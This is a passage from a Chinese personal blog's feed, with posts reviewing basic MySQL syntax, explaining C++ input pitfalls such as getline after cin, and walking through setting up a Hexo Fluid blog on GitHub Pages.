title="第三步"></a>第三步</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">3.结束本地预览，再重新预览即可。即重启一下本地预览即可。之后就可以发布了.<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL数据库复习</title>
    <link href="/2021/04/07/MySQL-MySQL%E5%A4%8D%E4%B9%A0/"/>
    <url>/2021/04/07/MySQL-MySQL%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>简单复习数据库MySQL知识.</p><h2 id="1）创建数据库"><a href="#1）创建数据库" class="headerlink" title="1）创建数据库"></a>1）创建数据库</h2><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">create database 数据库名;<br></code></pre></div></td></tr></table></figure><h2 id="2）删除数据库"><a href="#2）删除数据库" class="headerlink" title="2）删除数据库"></a>2）删除数据库</h2><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">drop database 数据库名;<br></code></pre></div></td></tr></table></figure><h2 id="3）选择数据库"><a href="#3）选择数据库" class="headerlink" title="3）选择数据库"></a>3）选择数据库</h2><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">use 数据库名;<br></code></pre></div></td></tr></table></figure><h2 id="4）数据类型"><a href="#4）数据类型" class="headerlink" title="4）数据类型"></a>4）数据类型</h2><h4 id="1-数值类型"><a href="#1-数值类型" class="headerlink" title="1.数值类型"></a>1.数值类型</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">tinyint<br>smallint<br>mediumint<br>int或integer<br>bigint<br>float<br>double<br>decimal<br></code></pre></div></td></tr></table></figure><h4 id="2-日期和时间类型"><a href="#2-日期和时间类型" class="headerlink" title="2.日期和时间类型"></a>2.日期和时间类型</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysqll">date &#x2F;&#x2F;YYYY-MM-DD<br>time &#x2F;&#x2F;HH:MM:SS<br>year &#x2F;&#x2F;YYYY<br>datetime &#x2F;&#x2F;YYYY-MM-DD HH:MM:SS<br>timestamp &#x2F;&#x2F;YYYYMMDD HHMMSS<br></code></pre></div></td></tr></table></figure><h4 id="3-字符串类型"><a href="#3-字符串类型" class="headerlink" title="3.字符串类型"></a>3.字符串类型</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">char &#x2F;&#x2F;定长字符串<br>varchar &#x2F;&#x2F;变长字符串<br>tinyblob &#x2F;&#x2F;不超过255个字符的二进制字符串<br>tinytext &#x2F;&#x2F;短文本字符串<br>blob &#x2F;&#x2F;长文本数据<br>text &#x2F;&#x2F;二进制形式的中等长度文本数据<br>mediumblob &#x2F;&#x2F;中等长度文本数据<br>mediumtext &#x2F;&#x2F;<br>longblob<br>longtext<br></code></pre></div></td></tr></table></figure><p>持续更新中······</p>]]></content>
    
    
    <categories>
      
      <category>MySQL数据库</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM-C++中的输入问题</title>
    <link href="/2021/04/07/ACM-C++%E4%B8%AD%E7%9A%84%E8%BE%93%E5%85%A5%E9%97%AE%E9%A2%98/"/>
    <url>/2021/04/07/ACM-C++%E4%B8%AD%E7%9A%84%E8%BE%93%E5%85%A5%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>C++中的几种输入方式，以及记录一些在输入输出中可能会遇到的让人头大的坑。</p><h1 id="一-输入带有空格的整行英语字母"><a href="#一-输入带有空格的整行英语字母" class="headerlink" title="一.输入带有空格的整行英语字母"></a>一.输入带有空格的整行英语字母</h1><h3 id="1-cin"><a href="#1-cin" class="headerlink" title="1.cin"></a>1.cin</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">遇“空格”、“TAB”、“回车”就结束<br></code></pre></div></td></tr></table></figure><h3 id="2-cin-getline"><a href="#2-cin-getline" class="headerlink" title="2.cin.getline()"></a>2.cin.getline()</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">接收一个字符串，可以接收空格并输出。可以设置自定义结束符。<br><span class="hljs-built_in">cin</span>.getline(接收字符串的变量,接收字符个数,结束字符) <span class="hljs-comment">//接收字符串的变量不能为string，需要是字符数组</span><br>当第三个参数省略时，系统默认为<span class="hljs-string">&#x27;\0&#x27;</span>。接收n个字符到m中，其中最后一个为<span class="hljs-string">&#x27;\0&#x27;</span>，所以只看到n<span class="hljs-number">-1</span>个字符输出.<br>例子<br><span class="hljs-built_in">cin</span>.getline(m,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<br>当输入jlkjkljkl时 输出 jlkj<br>输入jkaljkljkl时，输出 jk<br></code></pre></div></td></tr></table></figure><h3 id="3-getline"><a href="#3-getline" class="headerlink" title="3.getline()"></a>3.getline()</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">接收一个字符串，可以接收空格并输出，需包含头文件“<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;”</span></span><br><span class="hljs-built_in">string</span> str;<br>getline(<span class="hljs-built_in">cin</span>,str); <span class="hljs-comment">//str需要是string，不能为字符数组</span><br></code></pre></div></td></tr></table></figure><h3 id="输入陨石坑"><a href="#输入陨石坑" class="headerlink" title="输入陨石坑"></a>输入陨石坑</h3><p>要求：输入一个数n，再输入一句由n个单词构成英文句子(包括空格)。用C++中的输入输出实现。</p><p>错误的输入方式一：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">string</span> s;<br>getline(<span class="hljs-built_in">cin</span>,s);<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">25</span><br>abcd<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">25</span> <span class="hljs-comment">//当输入25后按回车，程序就结束了。不能再输入后面的 abcd 字符串了。</span><br>    <span class="hljs-comment">//这里会空一个回车行</span><br><br><span class="hljs-comment">//但是，当你换一种输入方式时，又有另一种情况</span><br><span class="hljs-comment">//输入</span><br><span class="hljs-number">25</span> abcd<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">25</span><br> abcd <span class="hljs-comment">//字符串前面有一个空格</span><br></code></pre></div></td></tr></table></figure><p>错误的输入方式二：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>;<br>getchar(); <span class="hljs-comment">//换成char ch=getchar() 也是同样的效果。c++中的清空输入缓冲区 cin.sync() 也不行</span><br><span class="hljs-built_in">string</span> s;<br>getline(<span class="hljs-built_in">cin</span>,s);<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">25</span><br>abcd<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">25</span><br>    <span class="hljs-comment">//这输出的是一句空字符串，没有任何的输出</span><br></code></pre></div></td></tr></table></figure><p>正确的输入方式：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cin</span>.get(); <span class="hljs-comment">//不能用getchar()函数</span><br><span class="hljs-built_in">string</span> s;<br>getline(<span class="hljs-built_in">cin</span>,s);<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">25</span><br>abcd<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">25</span><br>abcd<br></code></pre></div></td></tr></table></figure><p><strong>也可以定义两个string来实现</strong></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">string</span> s,c;<br>getline(<span class="hljs-built_in">cin</span>,c); <span class="hljs-comment">//用来吃掉n后面的回车</span><br>getline(<span class="hljs-built_in">cin</span>,s);<br><span class="hljs-built_in">cout</span>&lt;&lt;c&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">5</span><br>sfje few fwa<br><span class="hljs-comment">//输出</span><br>                 <span class="hljs-comment">//这是一个回车，即字符串c</span><br>sfje few fwa<br></code></pre></div></td></tr></table></figure><h1 id="二-输入二维字符数组"><a href="#二-输入二维字符数组" class="headerlink" title="二.输入二维字符数组"></a>二.输入二维字符数组</h1><h3 id="C语言实现"><a href="#C语言实现" class="headerlink" title="C语言实现"></a>C语言实现</h3><p>代码一，用%s输入：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">char</span> a[minn][minn]; <span class="hljs-comment">//m行n列的二维字符数组</span><br><span class="hljs-keyword">int</span> n,m;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,&amp;a[i]);<br><span class="hljs-comment">//getchar(); //这里的getchar()函数有无不影响最后的输出结果。需要与%c的方式输入时区别开</span><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;++j)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i][j]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br></code></pre></div></td></tr></table></figure><p>代码实现二，用%c输入：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">char</span> a[minn][minn];<br><span class="hljs-keyword">int</span> n,m;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;++j)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>,&amp;a[i][j]);<br>&#125;<br>getchar();<span class="hljs-comment">//这里的getchar()函数必须写，不然会出错。</span><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;++j)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i][j]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br></code></pre></div></td></tr></table></figure><h3 id="C-实现"><a href="#C-实现" class="headerlink" title="C++实现"></a>C++实现</h3><p>代码实现一：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">char</span> a[minn][minn];<br><span class="hljs-keyword">int</span> n,m;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;++j)&#123;<br> <span class="hljs-built_in">cin</span>&gt;&gt;a[i][j]; <span class="hljs-comment">//这里并没有使用getchar()之类的函数</span><br>&#125;<br>&#125;<br><br> <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;++j)&#123;<br><span class="hljs-built_in">cout</span>&lt;&lt;a[i][j];<br>&#125;<br> <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br></code></pre></div></td></tr></table></figure><p>代码实现二：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">char</span> a[minn][minn];<br><span class="hljs-keyword">int</span> n,m;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-built_in">cin</span>&gt;&gt;a[i];<br>&#125;<br><br> <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;++j)&#123;<br><span class="hljs-built_in">cout</span>&lt;&lt;a[i][j];<br>&#125;<br> <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//输入</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br></code></pre></div></td></tr></table></figure><p>持续更新中······</p>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo-Fluid主题-搭建个人博客</title>
    <link href="/2021/04/07/hexo-Fluid%E4%B8%BB%E9%A2%98-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2021/04/07/hexo-Fluid%E4%B8%BB%E9%A2%98-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Coding上，是搭建博客的首选框架。大家可以进入<a href="https://hexo.io/zh-cn/">hexo官网</a>进行详细查看，因为Hexo的创建者是台湾人，对中文的支持很友好，可以选择中文进行查看。</p><h1 id="Hexo搭建步骤"><a href="#Hexo搭建步骤" class="headerlink" title="Hexo搭建步骤"></a>Hexo搭建步骤</h1><h3 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1.安装Git"></a>1.安装Git</h3><p>Git是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。也就是用来管理你的hexo博客文章，上传到GitHub的工具。Git非常强大.</p><p>windows：到git官网上下载,<a href="https://gitforwindows.org/">Download git</a>,下载后会有一个Git Bash的命令行工具，以后就用这个工具来使用git。</p><p>linux：对linux来说实在是太简单了，因为最早的git就是在linux上编写的，只需要一行代码</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install git<br></code></pre></div></td></tr></table></figure><p>安装好后，用  git –version 来查看一下版本</p><h3 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h3><p>windows：<a href="https://nodejs.org/en/download/">nodejs</a>选择LTS版本就行了。<br>linux:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install nodejs<br>sudo apt-get install npm<br></code></pre></div></td></tr></table></figure><p>安装完后，检查有没有安装成功</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">node -v<br>npm -v<br></code></pre></div></td></tr></table></figure><h3 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h3><p>可以先创建一个文件夹blog，然后<code>cd</code>到这个文件夹下（或者在这个文件夹下直接 右键 -&gt; git bash 打开 ）。<br>然后输入命令</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">npm install -g hexo-cli<br></code></pre></div></td></tr></table></figure><p>可以用 hexo -v 查看一下版本</p><h4 id="3-1初始化hexo"><a href="#3-1初始化hexo" class="headerlink" title="3.1初始化hexo"></a>3.1初始化hexo</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hexo init myblog //myblog为文件夹名字，可以任意取<br><span class="hljs-built_in">cd</span> myblog //进入这个myblog文件夹<br>npm install<br></code></pre></div></td></tr></table></figure><p>之后，我文件夹中就会多一些文件夹</p><ul><li>node_modules: 依赖包</li><li>public：存放生成的页面</li><li>scaffolds：生成文章的一些模板</li><li>source：用来存放你的文章</li><li> themes：主题</li><li> _config.yml: 博客的配置文件</li></ul><p>然后再输入命令</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hexo g<br>hexo server  //hexo s<br></code></pre></div></td></tr></table></figure><p>再在浏览器输入 localhost:4000 就可以在本地看到你生成的博客了。此时不能关闭 git ，否则将无法在本地看见。也可以在 git 中输入  ctrl+c 来停止本地浏览。</p><h3 id="4-GitHub创建个人仓库"><a href="#4-GitHub创建个人仓库" class="headerlink" title="4.GitHub创建个人仓库"></a>4.GitHub创建个人仓库</h3><p>正常注册即可。</p><p>登录后，在GitHub.com中看到一个New repository，</p><p><img src="https://img-blog.csdnimg.cn/20210407201550136.png" alt="1"></p><p><img src="https://img-blog.csdnimg.cn/20210407201632462.png" alt="2"></p><p>点击 new 新建一个，</p><p>创建一个和你用户名相同的仓库，后面加.github.io，只有这样，将来要部署到GitHub page的时候，才会被识别，也就是xxxx.github.io，其中xxx就是你注册GitHub的用户名。我这里是已经建过了。填写好之后就可以 create repository 。</p><p><img src="https://img-blog.csdnimg.cn/20210407201651528.png" alt="3"></p><h3 id="5-生成SSH添加到GitHub"><a href="#5-生成SSH添加到GitHub" class="headerlink" title="5.生成SSH添加到GitHub"></a>5.生成SSH添加到GitHub</h3><p>在git bash中，输入命令，</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git config --global user.name <span class="hljs-string">&quot;yourname&quot;</span><br>git config --global user.email <span class="hljs-string">&quot;youremail&quot;</span><br>这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。这样GitHub才能对应账户。<br></code></pre></div></td></tr></table></figure><p>也可以检查一下你是否输入正确</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git config user.name<br>git config user.email<br>可以看是否是你输入的名称和邮箱。<br></code></pre></div></td></tr></table></figure><p>然后创建SSH,一路回车</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div 